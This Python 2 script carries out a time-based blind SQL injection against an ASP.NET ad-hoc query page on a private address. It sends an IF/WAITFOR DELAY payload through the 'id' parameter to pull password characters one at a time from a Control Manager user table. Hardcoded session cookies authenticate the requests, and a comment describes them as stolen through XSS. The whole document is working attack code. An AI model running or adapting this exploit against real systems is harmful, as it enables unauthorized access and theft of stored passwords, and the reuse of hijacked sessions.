#!/usr/bin/env python

import time,urllib,urllib2

global starttime,endtime,resulttime,target,cookie
starttime=1
endtime=1
resulttime=1

target = 'https://10.10.10.12/webapp/AdHocQuery/AdHocQuery_Processor.aspx'
cookie = ('ASP_NET_SessionId=qpnnk055skierd554xf40gup;'
' .ASPXAUTH=EA5475D44C34D74315EB314F665830A95B0AF853699D38A6DD58AB1F11CC'
'449AE6ACD0994DE47D02711E11EB9A73C47D6728B03923393A0502DF7D2D07A274AF37B3'
'798C9F730C0E7CD7760A48C99F514F58BC69DE8735D7B285B42AD2EED75117079A4FFA58C2C5CEB15906AEAE54CD37AF871F;'
' WFINFOR=admin; PHPSESSID=qp9eu34gckj5f364tlimdf4l72; un=7164ceee6266e893181da6c33936e4a4; '
'userID=1; LANG=en_US; wids=modPolicyList%2C; lastID=43; cname=dashBoard; theme=default; lastTab=9')

query=("' IF(UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(Password AS NVARCHAR(4000)),CHAR(32))) FROM db_ControlManager.dbo.tb_UserInfo"
" WHERE CONVERT(NVARCHAR(4000),Password)>CHAR(32)),1,1)) > 52) WAITFOR DELAY '0:0:4'--")

values = { 'Action': 'View',             # This is our injection parameter
           'id': '350b651c-15c5-45ca-8d64-33b20f3fc4d8'+query,
           'asc': 'true',
           'Sort': 7,
           'paging': 10 }
 
url = "%s?%s" % (target, urllib.urlencode(values))  # Create the request url
req = urllib2.Request(url)                          # Create a request for the specified url
req.add_header('Cookie', cookie)                    # Add the cookie we stolen using XSS to identify ourselves
try:                                                # Exception handling
    starttime=time.time()
    response = urllib2.urlopen(req)                 # Send the request and save the response object
    endtime = time.time()
    resulttime =str(endtime-starttime)
except:                                             # In-case of an exception
    print 'Failed to SQL inject'                    # Notify the user that there was an error
    sys.exit(-1)                                    # Stop execution of our exploit



#for item in range(1,10):
#	time.sleep(1)
#	print str(item) + " Time " + str(time.time())
#	resulttime += time.time() 

print "It take %s seconds" % resulttime